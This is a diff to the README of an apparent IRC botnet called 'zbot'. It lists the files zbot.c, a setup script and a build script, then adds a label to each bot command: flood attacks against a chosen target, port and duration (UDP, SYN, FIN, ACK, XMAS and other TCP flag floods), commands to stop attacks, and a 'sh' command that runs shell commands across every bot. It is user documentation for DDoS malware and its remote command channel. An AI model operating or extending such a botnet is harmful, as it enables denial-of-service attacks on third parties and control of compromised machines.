@@ -16,32 +16,32 @@ insist of messaging me via Twitter! http://twitter.com/codingplanets
 # File contents
 zbot-setup.py | zbot.c | zbot-build | Unreal3.2.zip
 # IRC Commands
-	!* udp <target> <port> <time>
+	!* udp <target> <port> <time>  |  raw udp attack
 # 
-	!* syn <target> <port> <time>
+	!* syn <target> <port> <time>  |  tcp syn attack
 # 
-	!* fin <target> <port> <time>
+	!* fin <target> <port> <time>  |  tcp fin attack
 # 
-	!* psh <target> <port> <time>
+	!* psh <target> <port> <time>  |  tcp psh attack
 # 
-    !* ack <target> <port> <time>
+    !* ack <target> <port> <time>  |  tcp ack attack
 # 
-    !* urg <target> <port> <time>
+    !* urg <target> <port> <time>  |  tcp urg attack
 # 
-    !* rst <target> <port> <time>
+    !* rst <target> <port> <time>  |  tcp rst attack
 # 
-    !* ece <target> <port> <time>
+    !* ece <target> <port> <time>  |  tcp ece attack
 # 
-    !* cwr <target> <port> <time>
+    !* cwr <target> <port> <time>  |  tcp cwr attack
 # 
-    !* sew <target> <port> <time>	
+    !* sew <target> <port> <time>  |  tcp sew attack
 # 
-    !* xmas <target> <port> <time>
+    !* xmas <target> <port> <time>  |  tcp xmas attack
 # 
-	  !* unknown <target> <time>
+	!* unknown <target> <time>   |  unknown attack type
 # 
-	  !* kill
+	!* kill   |  kill all pids
 # 
-	  !* killall
+	!* killall  |  kill all packeting attacks
 # 
-	  !* sh <command>
+	!* sh <command>   |  sends commands across all bots
